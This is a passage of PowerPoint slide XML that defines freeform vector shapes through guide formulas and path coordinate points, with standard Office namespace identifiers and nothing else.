                  <a:gd name="T53" fmla="*/ 0 h 150"/>
                  <a:gd name="T54" fmla="*/ 83 w 90"/>
                  <a:gd name="T55" fmla="*/ 3 h 150"/>
                  <a:gd name="T56" fmla="*/ 84 w 90"/>
                  <a:gd name="T57" fmla="*/ 4 h 150"/>
                  <a:gd name="T58" fmla="*/ 86 w 90"/>
                  <a:gd name="T59" fmla="*/ 5 h 150"/>
                  <a:gd name="T60" fmla="*/ 84 w 90"/>
                  <a:gd name="T61" fmla="*/ 29 h 150"/>
                  <a:gd name="T62" fmla="*/ 82 w 90"/>
                  <a:gd name="T63" fmla="*/ 34 h 150"/>
                  <a:gd name="T64" fmla="*/ 80 w 90"/>
                  <a:gd name="T65" fmla="*/ 34 h 150"/>
                  <a:gd name="T66" fmla="*/ 80 w 90"/>
                  <a:gd name="T67" fmla="*/ 32 h 150"/>
                  <a:gd name="T68" fmla="*/ 78 w 90"/>
                  <a:gd name="T69" fmla="*/ 23 h 150"/>
                  <a:gd name="T70" fmla="*/ 75 w 90"/>
                  <a:gd name="T71" fmla="*/ 19 h 150"/>
                  <a:gd name="T72" fmla="*/ 67 w 90"/>
                  <a:gd name="T73" fmla="*/ 13 h 150"/>
                  <a:gd name="T74" fmla="*/ 53 w 90"/>
                  <a:gd name="T75" fmla="*/ 9 h 150"/>
                  <a:gd name="T76" fmla="*/ 42 w 90"/>
                  <a:gd name="T77" fmla="*/ 11 h 150"/>
                  <a:gd name="T78" fmla="*/ 34 w 90"/>
                  <a:gd name="T79" fmla="*/ 15 h 150"/>
                  <a:gd name="T80" fmla="*/ 28 w 90"/>
                  <a:gd name="T81" fmla="*/ 21 h 150"/>
                  <a:gd name="T82" fmla="*/ 25 w 90"/>
                  <a:gd name="T83" fmla="*/ 30 h 150"/>
                  <a:gd name="T84" fmla="*/ 27 w 90"/>
                  <a:gd name="T85" fmla="*/ 37 h 150"/>
                  <a:gd name="T86" fmla="*/ 36 w 90"/>
                  <a:gd name="T87" fmla="*/ 49 h 150"/>
                  <a:gd name="T88" fmla="*/ 55 w 90"/>
                  <a:gd name="T89" fmla="*/ 61 h 150"/>
                  <a:gd name="T90" fmla="*/ 63 w 90"/>
                  <a:gd name="T91" fmla="*/ 66 h 150"/>
                  <a:gd name="T92" fmla="*/ 78 w 90"/>
                  <a:gd name="T93" fmla="*/ 77 h 150"/>
                  <a:gd name="T94" fmla="*/ 86 w 90"/>
                  <a:gd name="T95" fmla="*/ 88 h 150"/>
                  <a:gd name="T96" fmla="*/ 88 w 90"/>
                  <a:gd name="T97" fmla="*/ 100 h 150"/>
                  <a:gd name="T98" fmla="*/ 90 w 90"/>
                  <a:gd name="T99" fmla="*/ 107 h 150"/>
                  <a:gd name="T100" fmla="*/ 84 w 90"/>
                  <a:gd name="T101" fmla="*/ 127 h 150"/>
                  <a:gd name="T102" fmla="*/ 70 w 90"/>
                  <a:gd name="T103" fmla="*/ 142 h 150"/>
                  <a:gd name="T104" fmla="*/ 62 w 90"/>
                  <a:gd name="T105" fmla="*/ 146 h 150"/>
                  <a:gd name="T106" fmla="*/ 45 w 90"/>
                  <a:gd name="T107" fmla="*/ 150 h 150"/>
                  <a:gd name="T108" fmla="*/ 36 w 90"/>
                  <a:gd name="T109" fmla="*/ 150 h 150"/>
                  <a:gd name="T110" fmla="*/ 11 w 90"/>
                  <a:gd name="T111" fmla="*/ 148 h 150"/>
                  <a:gd name="T112" fmla="*/ 4 w 90"/>
                  <a:gd name="T113" fmla="*/ 146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90" h="150">
                    <a:moveTo>
                      <a:pt x="4" y="146"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="4" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="113"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="113"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="109"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="109"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="127"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="59" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="125"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="109"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="103"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="96"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="73"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="67"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="34" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="33"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="73" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="34" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="30" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="28" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="25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7" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="49"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="66"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="71"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="82"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="88"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="87" y="94"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="100"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="107"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="107"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="127"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="1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7" name="Freeform 140">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68585A93-7305-438F-9AB9-B3D894DA2346}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4809419" y="2163595"/>
                <a:ext cx="91049" cy="127125"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 21 w 106"/>
                  <a:gd name="T1" fmla="*/ 16 h 148"/>
                  <a:gd name="T2" fmla="*/ 19 w 106"/>
                  <a:gd name="T3" fmla="*/ 10 h 148"/>
                  <a:gd name="T4" fmla="*/ 12 w 106"/>
                  <a:gd name="T5" fmla="*/ 6 h 148"/>
                  <a:gd name="T6" fmla="*/ 2 w 106"/>
                  <a:gd name="T7" fmla="*/ 4 h 148"/>
                  <a:gd name="T8" fmla="*/ 2 w 106"/>
                  <a:gd name="T9" fmla="*/ 2 h 148"/>
                  <a:gd name="T10" fmla="*/ 34 w 106"/>
                  <a:gd name="T11" fmla="*/ 2 h 148"/>
                  <a:gd name="T12" fmla="*/ 88 w 106"/>
                  <a:gd name="T13" fmla="*/ 2 h 148"/>
                  <a:gd name="T14" fmla="*/ 100 w 106"/>
                  <a:gd name="T15" fmla="*/ 0 h 148"/>
                  <a:gd name="T16" fmla="*/ 102 w 106"/>
                  <a:gd name="T17" fmla="*/ 2 h 148"/>
                  <a:gd name="T18" fmla="*/ 100 w 106"/>
                  <a:gd name="T19" fmla="*/ 14 h 148"/>
                  <a:gd name="T20" fmla="*/ 99 w 106"/>
                  <a:gd name="T21" fmla="*/ 27 h 148"/>
                  <a:gd name="T22" fmla="*/ 96 w 106"/>
                  <a:gd name="T23" fmla="*/ 31 h 148"/>
                  <a:gd name="T24" fmla="*/ 95 w 106"/>
                  <a:gd name="T25" fmla="*/ 28 h 148"/>
                  <a:gd name="T26" fmla="*/ 94 w 106"/>
                  <a:gd name="T27" fmla="*/ 20 h 148"/>
                  <a:gd name="T28" fmla="*/ 86 w 106"/>
                  <a:gd name="T29" fmla="*/ 15 h 148"/>
                  <a:gd name="T30" fmla="*/ 49 w 106"/>
                  <a:gd name="T31" fmla="*/ 12 h 148"/>
                  <a:gd name="T32" fmla="*/ 48 w 106"/>
                  <a:gd name="T33" fmla="*/ 15 h 148"/>
                  <a:gd name="T34" fmla="*/ 48 w 106"/>
                  <a:gd name="T35" fmla="*/ 64 h 148"/>
                  <a:gd name="T36" fmla="*/ 85 w 106"/>
                  <a:gd name="T37" fmla="*/ 64 h 148"/>
                  <a:gd name="T38" fmla="*/ 94 w 106"/>
                  <a:gd name="T39" fmla="*/ 61 h 148"/>
                  <a:gd name="T40" fmla="*/ 96 w 106"/>
                  <a:gd name="T41" fmla="*/ 58 h 148"/>
                  <a:gd name="T42" fmla="*/ 98 w 106"/>
                  <a:gd name="T43" fmla="*/ 60 h 148"/>
                  <a:gd name="T44" fmla="*/ 96 w 106"/>
                  <a:gd name="T45" fmla="*/ 74 h 148"/>
                  <a:gd name="T46" fmla="*/ 95 w 106"/>
                  <a:gd name="T47" fmla="*/ 90 h 148"/>
                  <a:gd name="T48" fmla="*/ 94 w 106"/>
                  <a:gd name="T49" fmla="*/ 91 h 148"/>
                  <a:gd name="T50" fmla="*/ 92 w 106"/>
                  <a:gd name="T51" fmla="*/ 90 h 148"/>
                  <a:gd name="T52" fmla="*/ 90 w 106"/>
                  <a:gd name="T53" fmla="*/ 81 h 148"/>
                  <a:gd name="T54" fmla="*/ 81 w 106"/>
                  <a:gd name="T55" fmla="*/ 76 h 148"/>
                  <a:gd name="T56" fmla="*/ 49 w 106"/>
                  <a:gd name="T57" fmla="*/ 74 h 148"/>
                  <a:gd name="T58" fmla="*/ 48 w 106"/>
                  <a:gd name="T59" fmla="*/ 91 h 148"/>
                  <a:gd name="T60" fmla="*/ 48 w 106"/>
                  <a:gd name="T61" fmla="*/ 120 h 148"/>
                  <a:gd name="T62" fmla="*/ 52 w 106"/>
                  <a:gd name="T63" fmla="*/ 131 h 148"/>
                  <a:gd name="T64" fmla="*/ 62 w 106"/>
                  <a:gd name="T65" fmla="*/ 136 h 148"/>
                  <a:gd name="T66" fmla="*/ 85 w 106"/>
                  <a:gd name="T67" fmla="*/ 136 h 148"/>
                  <a:gd name="T68" fmla="*/ 94 w 106"/>
                  <a:gd name="T69" fmla="*/ 133 h 148"/>
                  <a:gd name="T70" fmla="*/ 100 w 106"/>
                  <a:gd name="T71" fmla="*/ 126 h 148"/>
                  <a:gd name="T72" fmla="*/ 103 w 106"/>
                  <a:gd name="T73" fmla="*/ 118 h 148"/>
                  <a:gd name="T74" fmla="*/ 106 w 106"/>
                  <a:gd name="T75" fmla="*/ 118 h 148"/>
                  <a:gd name="T76" fmla="*/ 106 w 106"/>
                  <a:gd name="T77" fmla="*/ 122 h 148"/>
                  <a:gd name="T78" fmla="*/ 103 w 106"/>
                  <a:gd name="T79" fmla="*/ 143 h 148"/>
                  <a:gd name="T80" fmla="*/ 92 w 106"/>
                  <a:gd name="T81" fmla="*/ 148 h 148"/>
                  <a:gd name="T82" fmla="*/ 56 w 106"/>
                  <a:gd name="T83" fmla="*/ 147 h 148"/>
                  <a:gd name="T84" fmla="*/ 21 w 106"/>
                  <a:gd name="T85" fmla="*/ 147 h 148"/>
                  <a:gd name="T86" fmla="*/ 8 w 106"/>
                  <a:gd name="T87" fmla="*/ 147 h 148"/>
                  <a:gd name="T88" fmla="*/ 4 w 106"/>
                  <a:gd name="T89" fmla="*/ 145 h 148"/>
                  <a:gd name="T90" fmla="*/ 7 w 106"/>
                  <a:gd name="T91" fmla="*/ 143 h 148"/>
                  <a:gd name="T92" fmla="*/ 17 w 106"/>
                  <a:gd name="T93" fmla="*/ 141 h 148"/>
                  <a:gd name="T94" fmla="*/ 20 w 106"/>
                  <a:gd name="T95" fmla="*/ 132 h 148"/>
                  <a:gd name="T96" fmla="*/ 21 w 106"/>
                  <a:gd name="T97" fmla="*/ 57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06" h="148">
                    <a:moveTo>
                      <a:pt x="21" y="57"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="21" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="7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4" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="4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34" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="34" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="2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100" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="81" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="81" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="85" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="85" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="98" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="87"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="90"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="78"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="85" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="81" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="81" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="74"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="77"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="75" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="85" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="118"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="119"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="122"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="122"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="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8" name="Freeform 141">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA9742A4-68D7-485B-8F3B-AAB42CD3B1A3}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
